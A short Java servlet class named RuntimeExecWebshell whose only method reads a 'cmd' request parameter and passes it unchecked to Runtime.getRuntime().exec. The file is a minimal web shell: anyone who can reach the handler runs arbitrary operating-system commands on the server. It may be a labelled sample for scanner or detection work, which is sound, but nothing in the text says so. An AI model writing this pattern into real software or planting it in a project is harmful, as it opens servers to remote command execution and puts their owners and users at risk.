import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

class RuntimeExecWebshell {
    public void handle(HttpServletRequest request) throws IOException {
        String cmd = request.getParameter("cmd");
        Runtime.getRuntime().exec(cmd);
    }
}

